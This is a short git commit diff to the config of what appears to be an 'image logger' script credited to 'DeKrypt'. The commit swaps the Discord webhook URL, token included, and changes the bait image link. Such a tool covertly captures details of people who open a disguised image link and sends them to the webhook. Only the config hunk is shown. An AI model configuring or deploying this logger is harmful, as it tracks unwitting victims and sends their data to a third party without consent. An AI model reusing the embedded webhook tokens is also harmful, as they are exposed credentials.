e4db80797a69fb8a009ffa9f78dfdccd64199f4c
opswasxx <igonefornow3@gmail.com>
2025-05-14 18:18:32 +0300

    image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1372231033793286245/9ZC1SBgbOTVzwCOHLDyTwrmBOh12WgcnTgTjHofREaatzP38DMrxbJnk3fmP1JYIM_Ka",
+    "image": "https://www.lifewire.com/thmb/RYYY7FRD7qz__Nir8Nf_1wnZlz0=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/009-how-to-create-a-desktop-shortcut-on-windows-bf4f5510ddab4da297d068e1b04fcfde.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
